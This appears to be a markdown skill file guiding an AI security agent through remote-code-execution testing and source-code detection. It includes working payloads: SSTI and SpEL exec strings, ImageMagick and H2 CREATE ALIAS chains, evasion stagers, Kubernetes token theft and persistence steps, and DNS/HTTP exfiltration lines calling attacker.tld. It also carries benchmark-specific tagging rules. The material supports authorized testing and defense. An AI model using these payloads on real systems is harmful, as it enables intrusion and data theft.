---
name: rce
description: RCE testing covering command injection, deserialization, template injection, and code evaluation
---

# RCE

Remote code execution delivers full server control when untrusted input reaches code execution primitives: OS command wrappers, dynamic evaluators, template engines, deserializers, media processing pipelines, and build or runtime tooling. Prioritize quiet, portable oracles and advance to stable shell access only when the engagement requires it.

## Where to Look

**Command Execution**
- OS command execution through wrappers, system utilities, and CLI invocations

**Dynamic Evaluation**
- Template engines, expression languages, eval/vm constructs

**Deserialization**
- Unsafe deserialization and gadget chains across language ecosystems

**Media Pipelines**
- ImageMagick, Ghostscript, ExifTool, LaTeX, ffmpeg

**SSRF Chains**
- Internal services exposing execution primitives such as FastCGI and Redis

**Container Escalation**
- Application-level RCE chained to node or cluster compromise via Docker/Kubernetes misconfigurations

## How to Detect

### Time-Based

**Unix**
- `;sleep 1`, `` `sleep 1` ``, `|| sleep 1`
- Gate delays with short subcommands to lower ambient noise

**Windows**
- CMD: `& timeout /t 2 &`, `ping -n 2 127.0.0.1`
- PowerShell: `Start-Sleep -s 2`

### OAST

**DNS**
```bash
nslookup $(whoami).x.attacker.tld
```

**HTTP**
```bash
curl https://attacker.tld/$(hostname)
```

### Output-Based

**Direct**
```bash
;id;uname -a;whoami
```

**Encoded**
```bash
;(id;hostname)|base64
```

## Vulnerability Patterns

### Command Injection

**Delimiters and Operators**
- Unix: `; | || & && `cmd` $(cmd) $() ${IFS}` newline/tab
- Windows: `& | || ^`

**Argument Injection**
- Inject flags or filenames into CLI arguments (e.g., `--output=/tmp/x`, `--config=`)
- Escape quoted segments by alternating quote styles and escape characters
- Environment expansion: `$PATH`, `${HOME}`, command substitution
- Windows: `%TEMP%`, `!VAR!`, PowerShell `$(...)`

**Path and Builtin Confusion**
- Force absolute paths (`/usr/bin/id`) rather than relying on PATH resolution
- Substitute alternative tools (`printf`, `getent`) when `id` is filtered
- Leverage `sh -c` or `cmd /c` wrappers to reach the underlying shell

**Evasion**
- Whitespace/IFS: `${IFS}`, `$'\t'`, `<`
- Token splitting: `w'h'o'a'm'i`, `w"h"o"a"m"i`
- Variable construction: `a=i;b=d; $a$b`
- Base64 stagers: `echo payload | base64 -d | sh`
- PowerShell: `IEX([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(...)))`

### Template Injection

Identify the server-side template engine in use: Jinja2/Twig/Blade/Freemarker/Velocity/Thymeleaf/EJS/Handlebars/Pug

**Minimal Probes**
```
Jinja2: {{7*7}} → {{cycler.__init__.__globals__['os'].popen('id').read()}}
Twig: {{7*7}} → {{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}
Freemarker: ${7*7} → <#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
EJS: <%= global.process.mainModule.require('child_process').execSync('id') %>
```

### Deserialization and EL

**Java**
- Gadget chains via CommonsCollections/BeanUtils/Spring
- Tools: ysoserial
- JNDI/LDAP chains (Log4Shell-style) when lookup paths are reachable

**.NET**
- BinaryFormatter/DataContractSerializer
- APIs accepting untrusted ViewState without MAC validation

**PHP**
- `unserialize()` and PHAR metadata deserialization
- Autoloaded gadget chains in frameworks and plugins

**Python/Ruby**
- pickle, `yaml.load`/`unsafe_load`, Marshal
- Automatic deserialization in message queues and cache layers

**Expression Languages**
- OGNL/SpEL/MVEL/EL expressions reaching Runtime/ProcessBuilder/exec

**Struts2 OGNL Version Boundaries (fast mode criteria)**
- Only report as high-confidence when BOTH of the following conditions are met:
  - `pom.xml` contains `org.apache.struts:struts2-core` at a version in the high-risk range (e.g., 2.3.x or <= 2.5.33)
  - The project contains reachable Struts action evidence (e.g., `struts.xml` with `<action>` mappings, `extends ActionSupport`, `implements Action`, `@Action(...)`)
- The following evidence is NOT sufficient on its own to confirm action reachability:
  - A Struts filter declaration in `web.xml` alone
  - Log configuration, package name references, or ordinary imports of `org.apache.struts2` / `com.opensymphony.xwork2`
- When only version evidence exists without reachable action evidence, classify as suspicious only — do not report as a high-confidence true positive

### Media and Document Pipelines

**ImageMagick/GraphicsMagick**
- policy.xml may restrict delegates; legacy vectors should still be tested
```
push graphic-context
fill 'url(https://x.tld/a"|id>/tmp/o")'
pop graphic-context
```

**Ghostscript**
- PostScript embedded in PDFs/PS files: `%pipe%id` and file operators

**ExifTool**
- Crafted metadata that invokes external tools or triggers library-level bugs

**LaTeX**
- `\write18`/`--shell-escape`, `\input` piping; pandoc filter chains

**ffmpeg**
- concat/protocol tricks gated by compile-time flag configuration

### SSRF to RCE

**FastCGI**
- `gopher://` to php-fpm (construct FPM records to invoke system/exec)

**Redis**
- `gopher://` to write cron jobs or authorized_keys to webroot
- Module load when the server permits it

**Admin Interfaces**
- Jenkins script console, Spark UI, Jupyter kernels reachable from internal network

### Container and Kubernetes

**Docker**
- From application RCE, inspect `/.dockerenv`, `/proc/1/cgroup`
- Enumerate mounts and capabilities: `capsh --print`
- Abuse paths: mounted docker.sock, hostPath mounts, privileged containers
- Write to `/proc/sys/kernel/core_pattern` or mount the host filesystem with `--privileged`

**Kubernetes**
- Steal service account token from `/var/run/secrets/kubernetes.io/serviceaccount`
- Query API server for pods and secrets; enumerate RBAC permissions
- Communicate with kubelet on 10250/10255; exec into adjacent pods
- Escalate via privileged pods, hostPath volume mounts, or daemonsets

## Evasion Patterns

**Encoding Differentials**
- URL encoding, Unicode normalization, comment insertion, mixed case
- Request smuggling to route payloads through alternate parsers

**Binary Alternatives**
- Absolute paths and alternative binaries (busybox, sh, env)
- Windows variations across PowerShell and CMD
- Constrained-language mode bypasses

## Post-Exploitation

**Privilege Escalation**
- `sudo -l`; SUID binaries; capability enumeration (`getcap -r / 2>/dev/null`)

**Persistence**
- cron/systemd/user services; web shell deployed behind authentication
- Plugin hooks; supply-chain insertion into CI/CD pipelines

**Lateral Movement**
- SSH keys, cloud metadata service credentials, internal service tokens

## Analysis Workflow

1. **Identify sinks** — Command wrappers, template rendering, deserialization entry points, file converters, report generators, plugin hooks
2. **Establish oracle** — Timing delays, DNS/HTTP callbacks, or deterministic output diffs (length/ETag)
3. **Confirm context** — Current user, working directory, PATH, shell, SELinux/AppArmor status, containerization
4. **Map boundaries** — Readable/writable file paths, outbound egress routes
5. **Progress to control** — File write, scheduled execution, service restart hooks

## Confirming a Finding

1. Deliver a minimal, reproducible oracle (DNS/HTTP/timing) demonstrating controlled code execution
2. Show command context — uid, gid, cwd, environment — alongside controlled output
3. Demonstrate persistence or file write within application constraints
4. If containerized, document boundary crossing attempts (host files, Kubernetes APIs) and whether they succeed
5. Keep PoCs minimal and reproducible across multiple runs and transport variants

## Common False Alarms

- Crashes or timeouts without any attacker-controlled behavioral outcome
- Filtered execution where only a constrained command subset runs without attacker-controlled arguments
- Sandboxed interpreters running in a restricted VM that prohibits IO and process spawning
- Simulated outputs not derived from actual executed commands

## Business Risk

- Remote system control under the application user account; potential privilege escalation to root
- Data theft, encryption and signing key compromise, supply-chain insertion, and lateral movement
- Cluster-wide compromise when chained with container or Kubernetes misconfigurations

## Analyst Notes

1. Prefer OAST oracles; avoid long sleeps — short gated delays minimize noise
2. When command injection produces only weak results, pivot to file write, deserialization, or SSTI paths
3. Treat converters and document renderers as first-class sinks; many run out-of-process with privileged delegates
4. For Java and .NET, enumerate classpath assemblies against known gadget libraries; confirm with out-of-band payloads
5. Always verify the execution environment: PATH, shell, umask, SELinux/AppArmor enforcement, container capabilities
6. Keep payloads portable across POSIX/BusyBox/PowerShell and minimize external dependencies
7. Document the smallest exploit chain that proves durable impact; avoid unnecessary shell drops

## Core Principle

RCE is a property of the execution boundary. Locate the sink, establish a quiet oracle, and advance toward durable control only as far as the engagement requires. Validate across transport variants and execution environments, since defenses frequently differ per code path.

## Distinguishing Command Injection from Generic RCE

Command injection and RCE are related but distinct vulnerability classes. Using the precise label improves triage accuracy and remediation guidance.

### Command Injection (OS Command Injection)
The attacker's input reaches an **OS shell or process execution sink** and is interpreted as part of a shell command:

**Sinks that indicate command injection:**
- Python: `os.system()`, `os.popen()`, `subprocess.Popen(shell=True)`, `subprocess.run(shell=True)`, `subprocess.call(shell=True)`
- PHP: `exec()`, `system()`, `passthru()`, `shell_exec()`, `popen()`, backtick operator
- Node.js: `child_process.exec()`, `child_process.execSync()`
- Java: `Runtime.getRuntime().exec()`, `ProcessBuilder` with user args
- Ruby: `system()`, backticks, `%x{}`, `IO.popen()`, `Open3.capture3()`

**Key characteristic**: the user input is concatenated into a **shell command string** or passed as **arguments to an OS process**. The exploit uses shell metacharacters (`;`, `|`, `&&`, `$()`, backticks) to inject additional commands.

### Generic RCE
Use RCE only when the execution primitive is **NOT an OS command shell** but rather a language-level code evaluation or injection mechanism:
- `eval()` / `exec()` (Python/JS/PHP code evaluation, not OS commands)
- Template injection leading to code execution (SSTI → RCE)
- Deserialization chains leading to arbitrary code execution
- Expression language injection (SpEL, OGNL, MVEL)
- ScriptEngine / Groovy shell / dynamic class loading

### Decision Rule
1. Does user input reach `system()`, `exec()` (shell), `popen()`, `subprocess(shell=True)`, `Runtime.exec()`, or equivalent OS command API? → **command injection**
2. Does user input reach `eval()`, `exec()` (code), template engine, deserializer, or expression parser? → **RCE** (or the more specific sub-class like SSTI, insecure deserialization)
3. CVE-based exploits (e.g., WordPress plugin RCE, Struts OGNL) where the exploit chain ultimately calls OS commands → **command injection** if the final sink is a shell command; otherwise **RCE**
4. When both exist (e.g., `eval()` that constructs and runs a shell command), prefer **command injection** if the attacker's primary control is over the OS command

### Common Misclassification Patterns
- Apache Struts OGNL injection with `Runtime.exec()` in the gadget chain → the primary vulnerability is command injection via OGNL, classify as **command injection**
- WordPress plugin vulnerabilities that lead to shell command execution → **command injection**
- `subprocess.Popen(f"curl {url}", shell=True)` → **command injection**, not SSRF (even though curl is involved, the shell interpretation is the vulnerability)
- PHP `system("convert " . $userInput)` → **command injection**
- Flask `eval(request.args.get('expr'))` → **RCE** (Python code evaluation, not shell)

## Java Source Detection Rules

### TRUE POSITIVE: Runtime.exec with user-controlled input (CWE-78)
- `Runtime.getRuntime().exec(userInput)` or `Runtime.getRuntime().exec(new String[]{..., userInput, ...})` where `userInput` comes from `@RequestParam`, `@PathVariable`, or request body = CONFIRM.
- `ProcessBuilder` with user-controlled args = CONFIRM.
- Even if the input is labeled as a "command" parameter in a demo app, the vulnerability is real.

### TRUE POSITIVE: SpEL expression injection (CWE-94/CWE-78)
- `ExpressionParser.parseExpression(userInput).getValue(...)` where `userInput` is HTTP request data = CONFIRM.
- Spring SPEL evaluation with user-controlled expression string = RCE.

### FALSE POSITIVE
- `Runtime.exec(...)` with a fully static/hardcoded command array (no user input in any element).
- Command execution inside a restricted sandbox where the application has no process spawn capability.

## Python/JS/PHP Source Detection Rules

### Python
- **VULN**: `os.system(user_input)`, `os.popen(user_input)`
- **VULN**: `subprocess.run(user_input, shell=True)` — shell=True with controllable input
- **VULN**: `subprocess.Popen(f"cmd {user_input}", shell=True)`
- **VULN**: `eval(user_input)`, `exec(user_input)`
- **SAFE**: `subprocess.run(["ls", user_input], shell=False)` — list form, no shell injection
- **KEY**: `shell=True` + any user input = HIGH RISK

### JavaScript (Node.js)
- **VULN**: `child_process.exec(userInput, callback)` — shell interprets the string
- **VULN**: `child_process.execSync(userInput)`
- **VULN**: `eval(req.body.code)`, `new Function(req.body.code)()`
- **SAFE**: `child_process.execFile('/bin/ls', [userInput])` — no shell spawned
- **SAFE**: `child_process.spawn('ls', [userInput])` — array args, no shell

### PHP
- **VULN**: `exec($userInput)`, `system($userInput)`, `passthru($userInput)`
- **VULN**: `` `$userInput` `` — backtick operator executes shell command
- **VULN**: `shell_exec($userInput)`, `proc_open($userInput, ...)`
- **SAFE**: `escapeshellarg()` + `escapeshellcmd()` wrapping (reduces risk but not a complete fix)

## Java Servlet Patterns — Command Injection (CWE-78)

**VULN** — tainted input reaches shell execution:
```java
Runtime.getRuntime().exec(new String[]{"sh", "-c", tainted})
Runtime.getRuntime().exec("cmd " + tainted)
new ProcessBuilder("sh", "-c", tainted).start()
```

**SAFE** — fixed commands only, no tainted data in command string:
```java
new ProcessBuilder("ls", "-la", fixedPath).start()  // SAFE if no tainted data
```

**Decision rule**: tainted data embedded in the shell command string or passed to `exec(String)` (single-string form) → **VULN**.

**Edge cases**:
- `Runtime.exec(cmd, env)` and `Runtime.exec(args, env, cwd)` are **VULN** when any element of the args/env array is tainted.
- Array-form execution is still **VULN** when any element is tainted: `new String[]{"sh", "-c", cmd + bar}`.
- Constant-fold obvious arithmetic or switch branches — if they force a fixed literal into the command → **SAFE**.
- If a helper method is called with a fixed literal and returns from that fixed-literal path, do not preserve taint from discarded temporaries → **SAFE**.

## Log4j2 Interpolation as RCE Source (Log4Shell)

```java
// VULNERABLE: Log4j2 < 2.15.0 logging user-controlled data
// The vulnerability is in WHAT gets logged — any user-controlled string containing
// ${jndi:ldap://...} triggers a JNDI lookup at log time

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

Logger logger = LogManager.getLogger();

// ALL of these are VULNERABLE if log4j-core < 2.15.0:
logger.info("User login: {}", request.getParameter("username"));
logger.error("Auth failed for: " + request.getHeader("X-Forwarded-For"));
logger.warn("Request from: {}", request.getHeader("User-Agent"));
logger.debug("Processing: {}", request.getRequestURI());
```

**VULN condition** (all three must hold):
1. `log4j-core` version < 2.15.0 in `pom.xml` / `build.gradle`
2. Logger logs user-controlled value (HTTP header, param, body, URI)
3. No mitigation: `-Dlog4j2.formatMsgNoLookups=true` or `log4j2.xml` with `%msg{nolookups}` pattern

```xml
<!-- pom.xml — vulnerable Log4j2 versions -->
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-core</artifactId>
    <version>2.14.1</version>  <!-- CVE-2021-44228: CRITICAL -->
</dependency>
```

**Safe versions**: log4j-core >= 2.17.1 (Java 11+), >= 2.12.4 (Java 8), >= 2.3.2 (Java 7) — all known RCE variants fixed

## Node.js child_process Patterns

```js
// VULNERABLE: exec() with user-controlled string (shell interprets special chars)
const { exec, execSync } = require('child_process');

app.get('/ping', (req, res) => {
    exec(`ping -c 1 ${req.query.host}`, (err, stdout) => {
        res.send(stdout);
    });
    // Attacker: host=127.0.0.1;id  → command injection
});

// VULNERABLE: template literal in exec
app.post('/convert', (req, res) => {
    execSync(`convert ${req.body.inputFile} ${req.body.outputFile}`);
    // Both arguments shell-interpreted — injection via ; | && etc.
});

// VULNERABLE: execSync with shell:true
const { spawnSync } = require('child_process');
spawnSync('bash', ['-c', req.query.cmd], { shell: true });

// SAFE: spawn with array args (no shell invocation)
const { spawn } = require('child_process');
spawn('ping', ['-c', '1', req.query.host]);   // array form, shell NOT invoked — SAFE
// But: verify req.query.host doesn't contain flag injection (--foo)
```

**Key distinction**:
- `exec(string)` → shell parses the entire string → **VULN** with any user input
- `spawn(cmd, [args])` → no shell, args passed directly → **SAFE** (unless cmd itself is user-controlled)
- `spawn(cmd, args, {shell: true})` → shell invoked → **VULN**

## Java EL/SpEL/OGNL Explicit Sink Detection

```java
// VULNERABLE: SpEL with StandardEvaluationContext (full power — T() type access)
ExpressionParser parser = new SpelExpressionParser();
Expression expr = parser.parseExpression(request.getParameter("query"));
Object result = expr.getValue(new StandardEvaluationContext());
// Attacker: query=T(java.lang.Runtime).getRuntime().exec('id')  → RCE

// VULNERABLE: OGNL evaluation with user input
Object value = Ognl.getValue(request.getParameter("expr"), context, root);

// VULNERABLE: MVEL
Object result = MVEL.eval(request.getParameter("expression"), vars);

// VULNERABLE: Groovy ScriptEngine
ScriptEngine engine = new ScriptEngineManager().getEngineByName("groovy");
engine.eval(request.getParameter("script"));

// VULNERABLE: BeanShell (bsh.Interpreter)
Interpreter interpreter = new Interpreter();
interpreter.eval(request.getParameter("bsh"));

// SAFE: SpEL with SimpleEvaluationContext — no type access, no method invocations
EvaluationContext ctx = SimpleEvaluationContext.forReadOnlyDataBinding().build();
parser.parseExpression(userInput).getValue(ctx);
```

## Groovy Script Injection via ScriptEngineManager

```java
// VULNERABLE: any JSR-223 script engine with user input
ScriptEngine engine = new ScriptEngineManager().getEngineByName("groovy");  // or "js", "ruby"
engine.eval(request.getParameter("script"));
// ScriptEngine gives full language access → RCE

// VULNERABLE: Scripting API used in report/template generation
ScriptEngine nashorn = new ScriptEngineManager().getEngineByName("nashorn");
nashorn.eval(request.getParameter("filter"));   // Nashorn (Java's JS engine) = full RCE
// Note: Nashorn deprecated in Java 11+, GraalVM Polyglot API used instead

// VULNERABLE: GraalVM Polyglot
Context polyContext = Context.newBuilder("js").build();
polyContext.eval("js", request.getParameter("code"));  // full JS execution = RCE
```

## H2 Console / CREATE ALIAS Code Execution

```java
// VULNERABLE: H2 in-memory DB with user-controlled SQL, allowing DDL
// H2's CREATE ALIAS allows defining Java methods:
// CREATE ALIAS EXEC AS $$ void exec(String s) throws Exception { Runtime.getRuntime().exec(s); } $$
// CALL EXEC('id')

// VULN indicator: application executes user-controlled SQL against H2 database
Statement stmt = h2Connection.createStatement();
stmt.execute(request.getParameter("sql"));   // DDL allowed → CREATE ALIAS → RCE

// VULN indicator: H2 INIT parameter in JDBC URL
String jdbcUrl = "jdbc:h2:mem:test;" + request.getParameter("options");
// options=INIT=CREATE ALIAS EXEC AS $$ ... $$\;CALL EXEC('id')
Connection conn = DriverManager.getConnection(jdbcUrl);
```

## Java Additional RCE Sinks Checklist

Flag any of these when user-controlled data flows into them:

| Sink | Tag | Condition |
|------|-----|-----------|
| `Runtime.getRuntime().exec(tainted)` | rce | tainted = user input or concatenated user input |
| `new ProcessBuilder(tainted).start()` | rce | any arg tainted |
| `new ProcessBuilder("sh", "-c", tainted).start()` | rce | always VULN |
| `SpelExpressionParser().parseExpression(tainted)` | rce | StandardEvaluationContext |
| `Ognl.getValue(tainted, ...)` | rce | tainted = user input |
| `MVEL.eval(tainted, ...)` | rce | tainted = user input |
| `new GroovyShell().evaluate(tainted)` | rce | always VULN |
| `ScriptEngine.eval(tainted)` | rce | always VULN |
| `ObjectInputStream.readObject()` on user stream | insecure_deserialization | — |
| `new InitialContext().lookup(tainted)` | rce + ssrf | JNDI injection |
| H2 `stmt.execute(tainted)` with DDL allowed | rce | CREATE ALIAS path |
| Log4j2 < 2.15.0 logging user strings | rce | Log4Shell |

**Benchmark tag override**: In benchmark mode, prefer more specific tags per SKILL.md guardrails: `command_injection` for direct shell/process execution sinks, `spel_injection` for SpEL expression evaluation, `jndi_injection` for JNDI lookup sinks. Use `rce` only when no more specific benchmark tag applies.

## Node.js RCE Sink Checklist

| Sink | Condition | Verdict |
|------|-----------|---------|
| `exec(userInput)` | any user input | VULN |
| `execSync(userInput)` | any user input | VULN |
| `eval(userInput)` | any user input | VULN |
| `new Function(userInput)()` | any user input | VULN |
| `vm.runInThisContext(userInput)` | any user input | VULN |
| `spawn(cmd, [args])` | cmd hardcoded, args = user input | SAFE (no shell) |
| `spawn(cmd, args, {shell:true})` | any user arg | VULN |
| `child_process.fork(userInput)` | user-controlled module path | VULN (arbitrary module load) |
- Direct `Runtime.getRuntime().exec(...)`, `ProcessBuilder`, shell wrappers, or SSI/CGI-to-command chains should use benchmark tag `command_injection`, not generic `rce`, when the first dangerous sink is OS command execution.
- In `SecExample`, `rcecontroller` is project-level `command_injection`.
- In `vulhub`, `httpd/ssi-rce` and similar upload/SSI execution samples should preserve `command_injection` at project-tag layer.
- FALSE POSITIVE guard: keep `rce` only when no more specific benchmark tag exists.
- In `SecExample`, `/rceoutput` with `Runtime.getRuntime().exec(command)` must preserve benchmark tag `command_injection`; do not emit an extra standalone `rce` tag for that same source→sink path.

## Unsafe Reflection Detection (CWE-470)

When user-controlled input reaches `Class.forName()` or similar reflection APIs, an attacker can instantiate arbitrary classes, invoke methods, or access fields — leading to RCE, privilege escalation, or sandbox escape.

### Vulnerable Patterns

```java
// VULNERABLE: user input controls the class name
String className = request.getParameter("class");
Class<?> clazz = Class.forName(className);
Object obj = clazz.getDeclaredConstructor().newInstance();

// VULNERABLE: reflection chain with user-controlled method name
String methodName = request.getParameter("method");
Method m = clazz.getMethod(methodName);
m.invoke(obj);

// VULNERABLE: ServiceLoader or plugin loader with user-controlled class path
URLClassLoader loader = new URLClassLoader(new URL[]{new URL(userInput)});
Class<?> plugin = loader.loadClass(request.getParameter("plugin"));
```

### Safe Patterns

```java
// SAFE: allowlist of permitted class names
Map<String, Class<?>> allowed = Map.of("csv", CsvExporter.class, "json", JsonExporter.class);
Class<?> clazz = allowed.get(request.getParameter("format"));
if (clazz == null) throw new IllegalArgumentException("Unknown format");
```

### Detection Rules

- `Class.forName(userInput)` where `userInput` is derived from HTTP request data → **CONFIRM** (CWE-470)
- `ClassLoader.loadClass(userInput)` with user-controlled class name → **CONFIRM**
- Reflection combined with `newInstance()` or `Method.invoke()` on user-controlled targets → **CONFIRM**

### Tag Selection

- When the reflection sink leads to arbitrary class instantiation or method invocation: tag as `rce`
- When the reflection is limited to loading a class without instantiation and no further exploitation is evident: tag as `unsafe_reflection` if supported, otherwise `rce`
- In benchmark mode, prefer the tag that matches the ground truth taxonomy of the project
